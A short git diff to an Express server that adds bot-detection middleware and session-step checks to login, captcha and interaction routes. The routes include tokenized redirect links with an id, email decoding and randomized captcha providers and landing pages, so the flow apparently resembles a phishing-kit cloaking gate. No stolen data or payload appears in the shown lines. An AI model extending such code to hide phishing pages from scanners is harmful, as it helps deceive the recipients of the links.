@@ -79,7 +79,7 @@ function isValidEmail(email) {
 }
 
 // Routes
-app.get('/login', (req, res) => {
+app.get('/login',botDetectionMiddleware, (req, res) => {
   const { id } = req.query;
 
   if (!id) {
@@ -130,7 +130,10 @@ function decodeEmailMiddleware(req, res, next){
 app.post('/generate', limiter, generateTokenController);
 app.get('/r/:token/:id?', botDetectionMiddleware, redirectController);
 
-app.get('/captcha', verifySessionMiddleware, (req, res) => {
+app.get('/captcha', verifySessionMiddleware,botDetectionMiddleware, (req, res) => {
+  if(!req.session.nextStep){
+    return res.status(403).json({ error: 'Forbidden' });
+  }
   const providers = ['google', 'cloudflare'];
   const selectedProvider = providers[Math.floor(Math.random() * providers.length)];
   req.session.captchaProvider = selectedProvider;
@@ -186,7 +189,10 @@ app.post('/captcha/validate', verifySessionMiddleware, async (req, res) => {
   }
 });
 
-app.get('/interaction', verifySessionMiddleware, (req, res) => {
+app.get('/interaction', botDetectionMiddleware, verifySessionMiddleware, (req, res) => {
+  if(!req.session.captchaPassed){
+    return res.status(403).json({ error: 'Forbidden' });
+  }
   const pages = ['2a', '2b', '2c', '2d', '2e'];
   const randomPage = pages[Math.floor(Math.random() * pages.length)];
   res.render(randomPage);
